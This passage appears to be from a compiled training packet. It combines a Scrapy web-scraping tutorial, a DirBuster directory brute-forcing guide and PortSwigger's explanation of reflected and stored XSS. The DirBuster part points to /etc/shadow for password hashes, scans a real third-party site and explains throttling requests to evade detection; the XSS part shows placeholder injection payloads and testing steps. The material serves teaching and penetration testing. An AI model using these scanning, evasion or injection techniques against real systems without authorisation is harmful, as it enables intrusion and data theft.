Information: Synchronous means that you have to wait for a job to finish to start a new job 
while Asynchronous means you can move to another job before the previous job has 
finished 
Here is an interesting DataCamp BeautifulSoup tutorial to learn. 
Scrapy Installation 
[[ PAGE 149 ]]
 
With Python 3.0 (and onwards) installed, if you are using anaconda, you can use conda to 
install scrapy. Write the following command in anaconda prompt: 
conda install -c conda-forge scrapy 
To install anaconda, look at these DataCamp tutorials for Mac and Windows. 
Alternatively, you can use Python Package Installer pip. This works for Linux, Mac, and 
Windows: 
pip install scrapy 
Scrapy Shell 
Scrapy also provides a web-crawling shell called as Scrapy Shell, that developers can use to test 
their assumptions on a site’s behavior. Let us take a web page for tablets at AliExpress e-
commerce website. You can use the Scrapy shell to see what components the web page 
returns and how you can use them to your requirements. 
Open your command line and write the following command: 
scrapy shell 
If you are using anaconda, you can write the above command at the anaconda prompt as well. 
Your output on the command line or anaconda prompt will be something like this: 
[[ PAGE 150 ]]
 
You have to run a crawler on the web page using the fetch command in the Scrapy shell. A 
crawler or spider goes through a webpage downloading its text and metadata. 
fetch(https://pt.aliexpress.com/category/201005406/special-store.html) 
Note: Always enclose URL in quotes, both single and double quotes work 
The output will be as follows: 
 
The crawler returns a response which can be viewed by using the view(response) command on 
shell: 
view(response) 
And the web page will be opened in the default browser. 
 
You can view the raw HTML script by using the following command in Scrapy shell: 
print(response.text) 
[[ PAGE 151 ]]
 
You will see the script that's generating the webpage. It is the same content that when you left 
right-click any blank area on a webpage and click view source or view page source. Since, you 
need only relevant information from the entire script, using browser developer tools you will 
inspect the required element. Let us take the following elements: 
• 
Tablet name 
• 
Tablet price 
• 
Number of orders 
• 
Name of store 
Right-click on the element you want and click inspect like below: 
 
Developer tools of the browser will help you a lot with web scraping. You can see that it is 
an <a> tag with a class product and the text contains the name of the product: 
 
[[ PAGE 152 ]]
Using CSS Selectors for Extraction 
You can extract this using the element attributes or the css selector like classes. Write the 
following in the Scrapy shell to extract the product name: 
response.css(".product::text").extract_first() 
The output will be: 
 
extract_first() extract the first element that satisfies the css selector. If you want to extract all 
the product names use extract(): 
response.css(".product::text").extract() 
 
Following code will extract price range of the products: 
response.css(".value::text").extract() 
[[ PAGE 153 ]]
 
Similarly, you can try with a number of orders and the name of the store. 
Using XPath for Extraction 
XPath is a query language for selecting nodes in an XML document [7]. You can navigate 
through an XML document using XPath. Behind the scenes, Scrapy uses Xpath to navigate to 
HTML document items. The CSS selectors you used above are also converted to XPath, but in 
many cases, CSS is very easy to use. But you should know how the XPath in Scrapy works. 
Go to your Scrapy Shell and 
write fetch(https://pt.aliexpress.com/category/201005406/special-store.html/) the same way 
as before. Try out the following code snippets [3]: 
response.xpath('/html').extract() 
This will show you all the code under the <html> tag. / means direct child of the node. If you 
want to get the <div> tags under the html tag you will write [3]: 
response.xpath('/html//div').extract() 
For XPath, you must learn to understand the use of / and // to know how to navigate through 
child and descendent nodes. Here is a helpful tutorial for XPath Nodes and some examples to 
try out. 
If you want to get all <div> tags, you can do it by drilling down without using the /html [3]: 
response.xpath("//div").extract() 
You can further filter your nodes that you start from and reach your desired nodes by using 
attributes and their values. Below is the syntax to use classes and their values. 
response.xpath("//div[@class='quote']/span[@class='text']").extract() 
response.xpath("//div[@class='quote']/span[@class='text']/text()").extract() 
Use text() to extract all text inside nodes 
Consider the following HTML code: 
 
[[ PAGE 154 ]]
You want to get the text inside the <a> tag, which is child node of <div> haing classes site-
notice-container container you can do it as follows: 
response.xpath('//div[@class="site-notice-container container"]/a[@class="notice-
close"]/text()').extract() 
 
Creating a Scrapy project and Custom Spider 
Web scraping can be used to make an aggregator that you can use to compare data. For 
example, you want to buy a tablet, and you want to compare products and prices together you 
can crawl your desired pages and store in an excel file. Here you will be scraping 
aliexpress.com for tablets information. 
Now, you will create a custom spider for the same page. First, you need to create a Scrapy 
project in which your code and results will be stored. Write the following command in the 
command line or anaconda prompt. 
scrapy startproject aliexpress 
 
This will create a hidden folder in your default python or anaconda installation. aliexpress will 
be the name of the folder. You can give any name. You can view the folder contents directly 
through explorer. Following is the structure of the folder: 
 
[[ PAGE 155 ]]
file/folder 
Purpose 
scrapy.cfg 
deploy configuration file 
aliexpress/ 
Project's Python module, you'll import your code from here 
__init.py__ 
Initialization file 
items.py 
project items file 
pipelines.py 
project pipelines file 
settings.py 
project settings file 
spiders/ 
a directory where you'll later put your spiders 
__init.py__ 
Initialization file 
Once you have created the project you will change to the newly created directory and write 
the following command: 
[scrapy genspider aliexpress_tablets](https://pt.aliexpress.com/category/201005406/special-
store.html) 
 
This creates a template file named aliexpress_tablets.py in the spiders directory as discussed 
above. The code in that file is as below: 
import scrapy 
 
class AliexpressTabletsSpider(scrapy.Spider): 
    name = 'aliexpress_tablets' 
    allowed_domains = ['aliexpress.com'] 
    start_urls = ['https://www.aliexpress.com/category/200216607/tablets.html'] 
 
[[ PAGE 156 ]]
 
    def parse(self, response): 
         pass 
In the above code you can see name, allowed_domains, sstart_urls and a parse function. 
• 
name: Name is the name of the spider. Proper names will help you keep track of all 
the spider's you make. Names must be unique as it will be used to run the spider 
when scrapy crawl name_of_spider is used. 
• 
allowed_domains (optional): An optional python list, contains domains that are 
allowed to get crawled. Request for URLs not in this list will not be crawled. This should 
include only the domain of the website (Example: aliexpress.com) and not the entire 
URL specified in start_urls otherwise you will get warnings. 
• 
start_urls: This requests for the URLs mentioned. A list of URLs where the spider will 
begin to crawl from, when no particular URLs are specified [4]. So, the first pages 
downloaded will be those listed here. The subsequent Request will be generated 
successively from data contained in the start URLs [4]. 
• 
parse(self, response): This function will be called whenever a URL is crawled 
successfully. It is also called the callback function. The response (used in Scrapy shell) 
returned as a result of crawling is passed in this function, and you write the extraction 
code inside it! 
Information: You can use BeautifulSoup inside parse() function of the Scrapy spider to parse 
the html document. 
Note: You can extract data through css selectors using response.css() as discussed in scrapy 
shell section but also using XPath (XML) that allows you to access child elements. You will see 
the example of response.xpath() in the code edited in pass() function. 
You will make changes to the aliexpress_tablet.py file. I have added another URL in start_urls. 
You can add the extraction logic to the pass() function as below: 
# -*- coding: utf-8 -*- 
import scrapy 
 
 
class AliexpressTabletsSpider(scrapy.Spider): 
    name = 'aliexpress_tablets' 
    allowed_domains = ['aliexpress.com'] 
    start_urls = ['https://www.aliexpress.com/category/200216607/tablets.html', 
                 
'https://www.aliexpress.com/category/200216607/tablets/2.html?site=glo&g=y&tag='] 
 
[[ PAGE 157 ]]
 
    def parse(self, response): 
 
        print("procesing:"+response.url) 
        #Extract data using css selectors 
        product_name=response.css('.product::text').extract() 
        price_range=response.css('.value::text').extract() 
        #Extract data using xpath 
        orders=response.xpath("//em[@title='Total Orders']/text()").extract() 
        company_name=response.xpath("//a[@class='store $p4pLog']/text()").extract() 
 
        row_data=zip(product_name,price_range,orders,company_name) 
 
        #Making extracted data row wise 
        for item in row_data: 
            #create a dictionary to store the scraped info 
            scraped_info = { 
                #key:value 
                'page':response.url, 
                'product_name' : item[0], #item[0] means product in the list and so on, index tells 
what value to assign 
                'price_range' : item[1], 
                'orders' : item[2], 
                'company_name' : item[3], 
            } 
 
            #yield or give the scraped info to scrapy 
            yield scraped_info 
Information: zip() takes n number of iterables and returns a list of tuples. ith element of the 
tuple is created using the ith element from each of the iterables. [8] 
The yield keyword is used whenever you are defining a generator function. A generator 
function is just like a normal function except it uses yield keyword instead of return. 
[[ PAGE 158 ]]
The yield keyword is used whenever the caller function needs a value and the function 
containing yield will retain its local state and continue executing where it left off after yielding 
value to the caller function. Here yield gives the generated dictionary to Scrapy which will 
process and save it! 
Now you can run the spider: 
scrapy crawl aliexpress_tablets 
You will see a long output at the command line like below: 
 
 
Exporting data 
You will need data to be presented as a CSV or JSON so that you can further use the data for 
analysis. This section of the tutorial will take you through how you can save CSV and JSON file 
for this data. 
To save a CSV file, open settings.py from the project directory and add the following lines: 
FEED_FORMAT="csv" 
FEED_URI="aliexpress.csv" 
After saving the settings.py, rerun the scrapy crawl aliexpress_tablets in your project directory. 
 
The CSV file will look like: 
[[ PAGE 159 ]]
 
Note: Everytime you run the spider it will append the file. 
• 
FEED_FORMAT [5]: This sets the format you want to store the data. Supported 
formats are: 
• 
     + JSON 
• 
     + CSV 
• 
     + JSON Lines 
• 
     + XML 
• 
FEED_URI [5]: This gives the location of the file. You can store a file on your local file 
storage or an FTP as well. 
Scrapy's Feed Export can also add a timestamp and the name of spider to your file name, or 
you can use these to identify a directory in which you want to store. 
• 
%(time)s: gets replaced by a timestamp when the feed is being created [5] 
• 
%(name)s: gets replaced by the spider name [5] 
For Example: 
• 
Store in FTP using one directory per spider [5]: 
ftp://user:password@ftp.example.com/scraping/feeds/%(name)s/%(time)s.json 
The Feed changes you make in settings.py will apply to all spiders in the project. You can also 
set custom settings for a particular spider that will override the settings in the settings.py file. 
# -*- coding: utf-8 -*- 
import scrapy 
 
 
class AliexpressTabletsSpider(scrapy.Spider): 
[[ PAGE 160 ]]
    name = 'aliexpress_tablets' 
    allowed_domains = ['aliexpress.com'] 
    start_urls = ['https://www.aliexpress.com/category/200216607/tablets.html', 
                 
'https://www.aliexpress.com/category/200216607/tablets/2.html?site=glo&g=y&tag='] 
 
    custom_settings={ 'FEED_URI': "aliexpress_%(time)s.json", 
                       'FEED_FORMAT': 'json'} 
 
    def parse(self, response): 
 
        print("procesing:"+response.url) 
        #Extract data using css selectors 
        product_name=response.css('.product::text').extract() 
        price_range=response.css('.value::text').extract() 
        #Extract data using xpath 
        orders=response.xpath("//em[@title='Total Orders']/text()").extract() 
        company_name=response.xpath("//a[@class='store $p4pLog']/text()").extract() 
 
        row_data=zip(product_name,price_range,orders,company_name) 
 
        #Making extracted data row wise 
        for item in row_data: 
            #create a dictionary to store the scraped info 
            scraped_info = { 
                #key:value 
                'page':response.url, 
                'product_name' : item[0], #item[0] means product in the list and so on, index tells 
what value to assign 
                'price_range' : item[1], 
                'orders' : item[2], 
                'company_name' : item[3], 
[[ PAGE 161 ]]
            } 
 
            #yield or give the scraped info to Scrapy 
            yield scraped_info 
response.url returns the URL of the page from which response is generated. After running the 
crawler using scrapy crawl aliexpress_tablets you can view the json file: 
 
Following Links 
You must have noticed, that there are two links in the start_urls. The second link is the page 2 
of the same tablets search results. It will become impractical to add all links. A crawler should 
be able to crawl by itself through all the pages, and only the starting point should be 
mentioned in the start_urls. 
If a page has subsequent pages, you will see a navigator for it at the end of the page that will 
allow moving back and forth the pages. In the case you have been implementing in this 
tutorial, you will see it like this: 
[[ PAGE 162 ]]
 
Here is the code that you will see: 
 
As you can see that under there is a <span> tag with class .ui-pagination-active class that is the 
current page you are on, and under that are all <a> tags with links to the next page. Everytime 
you will have to get the <a> tags after this <span> tag. Here comes a little bit of CSS! In this, 
you have to get sibling node and not a child node, so you have to make a css selector that tells 
the crawler to find <a> tags that are after <span> tag with .ui-pagination-active class. 
Remember! Each web page has its own structure. You will have to study the structure a little bit 
on how you can get the desired element. Always try out response.css(SELECTOR) on Scrapy 
Shell before writing them in code. 
Modify your aliexpress_tablets.py as below: 
 
import scrapy 
[[ PAGE 163 ]]
 
 
class AliexpressTabletsSpider(scrapy.Spider): 
    name = 'aliexpress_tablets' 
    allowed_domains = ['aliexpress.com'] 
    start_urls = ['https://www.aliexpress.com/category/200216607/tablets.html'] 
 
 
    custom_settings={ 'FEED_URI': "aliexpress_%(time)s.csv", 
                       'FEED_FORMAT': 'csv'} 
 
    def parse(self, response): 
 
        print("procesing:"+response.url) 
        #Extract data using css selectors 
        product_name=response.css('.product::text').extract() 
        price_range=response.css('.value::text').extract() 
        #Extract data using xpath 
        orders=response.xpath("//em[@title='Total Orders']/text()").extract() 
        company_name=response.xpath("//a[@class='store $p4pLog']/text()").extract() 
 
        row_data=zip(product_name,price_range,orders,company_name) 
 
        #Making extracted data row wise 
        for item in row_data: 
            #create a dictionary to store the scraped info 
            scraped_info = { 
                #key:value 
                'page':response.url, 
                'product_name' : item[0], #item[0] means product in the list and so on, index tells 
what value to assign 
[[ PAGE 164 ]]
                'price_range' : item[1], 
                'orders' : item[2], 
                'company_name' : item[3], 
            } 
 
            #yield or give the scraped info to scrapy 
            yield scraped_info 
 
 
            NEXT_PAGE_SELECTOR = '.ui-pagination-active + a::attr(href)' 
            next_page = response.css(NEXT_PAGE_SELECTOR).extract_first() 
            if next_page: 
                yield scrapy.Request( 
                response.urljoin(next_page), 
                callback=self.parse) 
In the above code: 
• 
you first extracted the link of the next page using next_page = 
response.css(NEXT_PAGE_SELECTOR).extract_first() and then if the 
variable next_page gets a link and is not empty, it will enter the if body. 
• 
response.urljoin(next_page): The parse() method will use this method to build a new 
url and provide a new request, which will be sent later to the callback. [9] 
• 
After receiving the new URL, it will scrape that link executing the for body and again 
look for the next page. This will continue until it doesn't get a next page link. 
Here you might want to sit back and enjoy your spider scraping all the pages. The above spider 
will extract from all subsequent pages. That will be a lot of scraping! But your spider will do it! 
Below you can see the size of the file has reached 1.1MB. 
 
[[ PAGE 165 ]]
Scrapy does it for you! 
In this tutorial, you have learned about Scrapy, how it compares to BeautifulSoup, Scrapy Shell 
and how to write your own spiders in Scrapy. Scrapy handles all the heavy load of coding for 
you, from creating project files and folders till handling duplicate URLs it helps you get heavy-
power web scraping in minutes and provides you support for all common data formats that 
you can further input in other programs. This tutorial will surely help you understand Scrapy 
and its framework and what you can do with it. To become a master in Scrapy, you will need to 
go through all the fantastic functionalities it has to provide, but this tutorial has made you 
capable of scraping groups of web pages in an efficient way. 
For further reading, you can refer to Offical Scrapy Docs. 
Also, don't forget to check out DataCamp's Web Scraping with Python course. 
References 
• 
[1] https://en.wikipedia.org/wiki/Scrapy 
• 
[2] https://www.analyticsvidhya.com/blog/2017/07/web-scraping-in-python-using-
scrapy/ 
• 
[3] https://www.accordbox.com/blog/scrapy-tutorial-7-how-use-xpath-scrapy/ 
• 
[4] https://doc.scrapy.org/en/latest/topics/spiders.html 
• 
[5] https://doc.scrapy.org/en/latest/topics/feed-exports.html 
• 
[6] https://www.accordbox.com/blog/scrapy-tutorial-1-scrapy-vs-beautiful-soup/ 
• 
[7] https://en.wikipedia.org/wiki/XPath 
• 
[8] https://medium.com/@happymishra66/zip-in-python-48cb4f70d013 
• 
[9] https://www.tutorialspoint.com/scrapy/scrapy_following_links.htm 
https://www.datacamp.com/community/tutorials/making-web-crawlers-scrapy-python 
Dirbuster 
Directory Traversal Attacks 
Directory traversal is a type of attack where we can navigate out of the default or index 
directory that we land in by default. By navigating to other directories, we may find directories 
that contain information and files that are thought to be unavailable. 
For instance, if we want to get the password hashes on the server, we would need to navigate 
to /etc/shadow on a Linux or Mac OS X server. We may be able to move to that directory by 
executing a directory traversal, but before we can do any of this, we need to know the 
directory structure of the web server. 
OWASP, or the Open Web Application Security Project, developed a tool that is excellent for 
this purpose, named DirBuster. It is basically a brute-force tool to find commonly used 
directory and file names in web servers. 
How DirBuster Works 
[[ PAGE 166 ]]
DirBuster's methods are really quite simple. You point it at a URL and a port (usually port 80 or 
443) and then you provide it with a wordlist (it comes with numerous—you only need to select 
which one you want to use). It then sends HTTP GET requests to the website and listens for the 
site's response. 
If the URL elicits a positive response (in the 200 range), it knows the directory or file exists. If it 
elicits a "forbidden" request, we can probably surmise that there is a directory or file 
there and that it is private. This may be a file or directory we want to target in our attack. 
HTTP Status Codes 
When the Internet was created, the W3C committee designed it to provide numeric code 
responses to an HTTP request to the website that would communicate its status. Basically, this 
is the way our browser knows whether the website exists or not (or if the server is down) and 
whether we may have typed the URL improperly. 
We all have probably see the 404 status code indicating the website is down or unavailable or 
we typed the URL wrong. We probably have never see the status code 200, because that 
indicates that everything went properly—but our browser does see it. 
Here is a summary of the most important HTTP status codes that every browser uses and 
DirBuster utilizes to find directories and files in websites. 
• 
100 Continue - Codes in the 100 range indicate that, for some reason, the client 
request has not been completed and the client should continue. 
• 
200 Successful - Codes in the 200 range generally mean the request was successful. 
• 
300 Multiple Choices - Codes in the 300 range can mean many things, but generally 
they mean that the request was not completed. 
• 
400 Bad Request - The codes in the 400 range generally signal a bad request. The most 
common is the 404 (not found) and 403 (forbidden). 
Now, let's get started using DirBuster. Once again, we are fortunate enough that it is built 
into Kali Linux, so it's not necessary to download or install any software. 
Step 1Fire Up Kali & Open DirBuster 
Let's start by opening Kali and then opening DirBuster. We can find DirBuster at Applications -
> Kali Linux -> Web Applications -> Web Crawlers -> dirbuster, as seen in the screenshot 
below. 
[[ PAGE 167 ]]
 
Step 2Open DirBuster 
When we click on "dirbuster," it opens with a GUI like that below. The first step is it to type in 
the name of the website we want to scan. Let's go back to our friends at SANS, one of the 
world's leading IT security training and consulting firms. Simply type in the URL of the site you 
want to scan and the port number (usually 80 for HTTP and 443 for HTTPS). In this case, we will 
scan port 80. 
http://sans.org:80 
[[ PAGE 168 ]]
 
Step 3Choose a Wordlist 
The next step is to choose a wordlist we want to use to find the directories and files. Go to the 
center of the GUI where it says "files with lists of dir/files" and click on "List Info" in the bottom 
far right. When you do, it will open a screen like that below listing all the available wordlists 
with a short description. 
[[ PAGE 169 ]]
 
Simply choose the list you want to use and enter into the "File with dir/file" field in the GUI. 
Here, I have chosen to use: 
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
[[ PAGE 170 ]]
 
Step 4Start! 
In the final step, we simply click on the "Start" button. When we do so, DirBuster will start 
generating GET requests and sending them to our selected URL with a request for each of the 
files and directories listed in our wordlist. 
[[ PAGE 171 ]]
 
As you can see, after three hours of running, DirBuster is beginning to develop a directory 
structure of the www.sans.org website from the responses it receives from the requests. 
 
[[ PAGE 172 ]]
DirBuster is another tool we can use to do reconnaissance on target websites before attacking. 
The more information we have, the greater our chances of success. 
https://null-byte.wonderhowto.com/how-to/hack-like-pro-find-directories-websites-using-
dirbuster-0157593/ 
Default Mode 
We start DirBuster and only input http://testphp.vulnweb.com/ in the target URL field. Leave 
the rest of the options as they are. DirBuster will now auto switch between HEAD and GET 
requests to perform a list based brute force attack. 
 
Let’s hit Start. DirBuster gets to work and starts brute forcing and we see various files and 
directories popping up in the result window. 
[[ PAGE 173 ]]
 
GET Request Method 
We will now set DirBuster to only use the GET request method. To make things go a little 
faster, the thread count is set to 200 and the “Go Faster” checkbox is checked. 
 
In the Results – Tree View we can see findings. 
[[ PAGE 174 ]]
 
Pure Brute Force (Numeric) 
DirBuo performs step allows a lot of control over the attack process, in this set we will be using 
only numerals to perform a pure brute force attack. This is done by selecting “Pure Brute 
Force” in the scanning type option and selecting “0-9” in the charset drop-down menu. By 
default, the minimum and maximum character limit are set. 
 
[[ PAGE 175 ]]
In the Results – Tree View we can see findings. 
 
Single Sweep (Non-recursive) 
We will now perform a single sweep brute force where the dictionary words are used only 
once. To achieve this, we will unselect the “Be Recursive” checkbox. 
 
[[ PAGE 176 ]]
In the Results – ListView we can see findings. 
 
Targeted Start 
Further exploring the control options provided by DirBuster, we will set it up to start looking 
from the “admin” directory. In the “Dir to start with” field, type “/admin” and hit start. 
 
In the Results – Tree View we can see findings. 
[[ PAGE 177 ]]
 
Blank Extensions 
DirBuster can also look into directories with a blank extension, this could potentially uncover 
data that might be otherwise left untouched. All we do is check the “Use Blank Extension” 
checkbox. 
 
We can see the processing happen and DirBuster testing to find directories with blank 
extensions. 
[[ PAGE 178 ]]
 
Search by File Type (.txt) 
We will be setting the file extension type to .txt, by doing so, DirBuster will look specifically for 
files with a .txt extension. Type “.txt” in the File extension field and hit start. 
 
We can see the processing happen and DirBuster testing to find directories with a .txt 
extension. 
[[ PAGE 179 ]]
 
Changing the DIR List 
We will now be changing the directory list in DirBuster. Options > Advanced Options > 
DirBuster Options > Dir list to use. Here is where we can browse and change the list to 
“directory-list-2.3-medium.txt”, found at /usr/share/dirbuster/wordlists/ in Kali. 
[[ PAGE 180 ]]
 
We can see the word list is now set. 
[[ PAGE 181 ]]
 
Following Redirects 
DirBuster by default is not set to follow redirects during the attack, but we can enable this 
option under Options > Follow Redirects. 
 
We can see the results in the scan information as the test progresses. 
[[ PAGE 182 ]]
 
Results in the Tree View. 
 
Attack through Proxy 
DirBuster can also attack using a proxy. In this scenario, we try to open a webpage at 
192.168.1.108 but are denied access. 
[[ PAGE 183 ]]
 
We set the IP in DirBuster as the attack target. 
 
Before we start the attack, we set up the proxy option under Options > Advance Options > 
Http Options. Here we check the “Run through a proxy” checkbox, input the IP 192.168.1.108 
in the Host field and set the port to 3129. 
[[ PAGE 184 ]]
 
We can see the test showing results. 
 
[[ PAGE 185 ]]
Adding File Extensions 
Some file extensions are not set to be searched for in DirBuster, mostly image formats. We can 
add these to be searched for by navigating to Options > Advanced Options > HTML Parsing 
Options. 
 
We will delete jpeg in this instance and click OK. 
[[ PAGE 186 ]]
 
In the File Extension filed we will type in “jpeg” to explicitly tell DirBuster to look for .jpeg 
format files. 
[[ PAGE 187 ]]
 
We can see in the testing process, DirBuster is looking for and finding jpeg files. 
 
Evading Detective Measures 
Exceeding the warranted requests per second during an attack is a sure shot way to get 
flagged by any kind of detective measures put into place. DirBuster lets us control the requests 
per second to bypass this defense. Options > Advanced Options > Scan Options is where we 
can enable this setting. 
[[ PAGE 188 ]]
 
We are setting Connection Time Out to 500, checking the Limit number of requests per second 
and setting that field to 20. 
[[ PAGE 189 ]]
 
Once the test initiated, we will see the results. The scan was stopped to show the initial 
findings. 
[[ PAGE 190 ]]
 
Once the scan is complete the actual findings can be seen. 
 
We hope you enjoy using this tool. It is a great tool that’s a must in a pentester’s arsenal. 
Stay tuned for more articles on the latest and greatest in hacking. 
Author: Shubham Sharma 
https://www.hackingarticles.in/comprehensive-guide-on-dirbuster-tool/ 
[[ PAGE 191 ]]
Cross Site Scripting Reflected and Stored 
What is reflected cross-site scripting? 
Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP 
request and includes that data within the immediate response in an unsafe way. 
Suppose a website has a search function which receives the user-supplied search term in a URL 
parameter: 
https://insecure-website.com/search?term=gift 
The application echoes the supplied search term in the response to this URL: 
<p>You searched for: gift</p> 
Assuming the application doesn't perform any other processing of the data, an attacker can 
construct an attack like this: 
https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script> 
This URL results in the following response: 
<p>You searched for: <script>/* Bad stuff here... */</script></p> 
If another user of the application requests the attacker's URL, then the script supplied by the 
attacker will execute in the victim user's browser, in the context of their session with the 
application. 
Impact of reflected XSS attacks 
If an attacker can control a script that is executed in the victim's browser, then they can 
typically fully compromise that user. Amongst other things, the attacker can: 
• 
Perform any action within the application that the user can perform. 
• 
View any information that the user is able to view. 
• 
Modify any information that the user is able to modify. 
• 
Initiate interactions with other application users, including malicious attacks, that will 
appear to originate from the initial victim user. 
There are various means by which an attacker might induce a victim user to make a request 
that they control, to deliver a reflected XSS attack. These include placing links on a website 
controlled by the attacker, or on another website that allows content to be generated, or by 
sending a link in an email, tweet or other message. The attack could be targeted directly 
against a known user, or could an indiscriminate attack against any users of the application: 
The need for an external delivery mechanism for the attack means that the impact of reflected 
XSS is generally less severe than stored XSS, where a self-contained attack can be delivered 
within the vulnerable application itself. 
Read more 
Exploiting cross-site scripting vulnerabilities 
Reflected XSS in different contexts 
[[ PAGE 192 ]]
There are many different varieties of reflected cross-site scripting. The location of the reflected 
data within the application's response determines what type of payload is required to exploit it 
and might also affect the impact of the vulnerability. 
In addition, if the application performs any validation or other processing on the submitted 
data before it is reflected, this will generally affect what kind of XSS payload is needed. 
Read more 
Cross-site scripting contexts 
How to find and test for reflected XSS vulnerabilities 
The vast majority of reflected cross-site scripting vulnerabilities can be found quickly and 
reliably using Burp Suite's web vulnerability scanner. 
Testing for reflected XSS vulnerabilities manually involves the following steps: 
• 
Test every entry point. Test separately every entry point for data within the 
application's HTTP requests. This includes parameters or other data within the URL 
query string and message body, and the URL file path. It also includes HTTP headers, 
although XSS-like behavior that can only be triggered via certain HTTP headers may not 
be exploitable in practice. 
• 
Submit random alphanumeric values. For each entry point, submit a unique random 
value and determine whether the value is reflected in the response. The value should 
be designed to survive most input validation, so needs to be fairly short and contain 
only alphanumeric characters. But it needs to be long enough to make accidental 
matches within the response highly unlikely. A random alphanumeric value of around 
8 characters is normally ideal. You can use Burp Intruder's number payloads 
[https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types
#numbers] with randomly generated hex values to generate suitable random values. 
And you can use Burp Intruder's grep payloads option to automatically flag responses 
that contain the submitted value. 
• 
Determine the reflection context. For each location within the response where the 
random value is reflected, determine its context. This might be in text between HTML 
tags, within a tag attribute which might be quoted, within a JavaScript string, etc. 
• 
Test a candidate payload. Based on the context of the reflection, test an initial 
candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified 
within the response. The easiest way to test payloads is to send the request to Burp 
Repeater, modify the request to insert the candidate payload, issue the request, and 
then review the response to see if the payload worked. An efficient way to work is to 
leave the original random value in the request and place the candidate XSS payload 
before or after it. Then set the random value as the search term in Burp Repeater's 
response view. Burp will highlight each location where the search term appears, letting 
you quickly locate the reflection. 
• 
Test alternative payloads. If the candidate XSS payload was modified by the 
application, or blocked altogether, then you will need to test alternative payloads and 
techniques that might deliver a working XSS attack based on the context of the 
[[ PAGE 193 ]]
reflection and the type of input validation that is being performed. For more details, 
see cross-site scripting contexts 
• 
Test the attack in a browser. Finally, if you succeed in finding a payload that appears 
to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL 
into the address bar, or by modifying the request in Burp Proxy's intercept view, and 
see if the injected JavaScript is indeed executed. Often, it is best to execute some 
simple JavaScript like alert(document.domain) which will trigger a visible popup within 
the browser if the attack succeeds. 
Common questions about reflected cross-site scripting 
What is the difference between reflected XSS and stored XSS? Reflected XSS arises when an 
application takes some input from an HTTP request and embeds that input into the immediate 
response in an unsafe way. With stored XSS, the application instead stores the input and 
embeds it into a later response in an unsafe way. 
What is the difference between reflected XSS and self-XSS? Self-XSS involves similar 
application behavior to regular reflected XSS, however it cannot be triggered in normal ways 
via a crafted URL or a cross-domain request. Instead, the vulnerability is only triggered if the 
victim themselves submits the XSS payload from their browser. Delivering a self-XSS attack 
normally involves socially engineering the victim to paste some attacker-supplied input into 
their browser. As such, it is normally considered to be a lame, low-impact issue. 
What is stored cross-site scripting? 
Stored cross-site scripting (also known as second-order or persistent XSS) arises when an 
application receives data from an untrusted source and includes that data within its later HTTP 
responses in an unsafe way. 
Suppose a website allows users to submit comments on blog posts, which are displayed to 
other users. Users submit comments using an HTTP request like the following: 
POST /post/comment HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 100 
 
postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlo
s%40normal-user.net 
After this comment has been submitted, any user who visits the blog post will receive the 
following within the application's response: 
<p>This post was extremely helpful.</p> 
Assuming the application doesn't perform any other processing of the data, an attacker can 
submit a malicious comment like this: 
<script>/* Bad stuff here... */</script> 
Within the attacker's request, this comment would be URL-encoded as: 
[[ PAGE 194 ]]
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E 
Any user who visits the blog post will now receive the following within the application's 
response: 
<p><script>/* Bad stuff here... */</script></p> 
The script supplied by the attacker will then execute in the victim user's browser, in the 
context of their session with the application. 
Impact of stored XSS attacks 
If an attacker can control a script that is executed in the victim's browser, then they can 
typically fully compromise that user. The attacker can carry out any of the actions that are 
applicable to the impact of reflected XSS vulnerabilities. 
In terms of exploitability, the key difference between reflected and stored XSS is that a stored 
XSS vulnerability enables attacks that are self-contained within the application itself. The 
attacker does not need to find an external way of inducing other users to make a particular 
request containing their exploit. Rather, the attacker places their exploit into the application 
itself and simply waits for users to encounter it. 
The self-contained nature of stored cross-site scripting exploits is particularly relevant in 
situations where an XSS vulnerability only affects users who are currently logged in to the 
application. If the XSS is reflected, then the attack must be fortuitously timed: a user who is 
induced to make the attacker's request at a time when they are not logged in will not be 
compromised. In contrast, if the XSS is stored, then the user is guaranteed to be logged in at 
the time they encounter the exploit. 
Read more 
Exploiting cross-site scripting vulnerabilities 
Stored XSS in different contexts 
There are many different varieties of stored cross-site scripting. The location of the stored data 
within the application's response determines what type of payload is required to exploit it and 
might also affect the impact of the vulnerability. 
In addition, if the application performs any validation or other processing on the data before it 
is stored, or at the point when the stored data is incorporated into responses, this will 
generally affect what kind of XSS payload is needed. 
Read more 
Cross-site scripting contexts 
How to find and test for stored XSS vulnerabilities 
Many stored XSS vulnerabilities can be found using Burp Suite's web vulnerability scanner. 
Testing for stored XSS vulnerabilities manually can be challenging. You need to test all relevant 
"entry points" via which attacker-controllable data can enter the application's processing, and 
all "exit points" at which that data might appear in the application's responses. 
Entry points into the application's processing include: 
[[ PAGE 195 ]]
• 
Parameters or other data within the URL query string and message body. 
• 
The URL file path. 
• 
HTTP request headers that might not be exploitable in relation to reflected XSS. 
• 
Any out-of-band routes via which an attacker can deliver data into the application. The 
routes that exist depend entirely on the functionality implemented by the application: 
a webmail application will process data received in emails; an application displaying a 
Twitter feed might process data contained in third-party tweets; and a news 
aggregator will include data originating on other web sites. 
The exit points for stored XSS attacks are all possible HTTP responses that are returned to any 
kind of application user in any situation. 
The first step in testing for stored XSS vulnerabilities is to locate the links between entry and 
exit points, whereby data submitted to an entry point is emitted from an exit point. The 
reasons why this can be challenging are that: 
• 
Data submitted to any entry point could in principle be emitted from any exit point. 
For example, user-supplied display names could appear within an obscure audit log 
that is only visible to some application users. 
• 
Data that is currently stored by the application is often vulnerable to being overwritten 
due to other actions performed within the application. For example, a search function 
might display a list of recent searches, which are quickly replaced as users perform 
other searches. 
To comprehensively identify links between entry and exit points would involve testing each 
permutation separately, submitting a specific value into the entry point, navigating directly to 
the exit point, and determining whether the value appears there. However, this approach is 
not practical in an application with more than a few pages. 
Instead, a more realistic approach is to work systematically through the data entry points, 
submitting a specific value into each one, and monitoring the application's responses to detect 
cases where the submitted value appears. Particular attention can be paid to relevant 
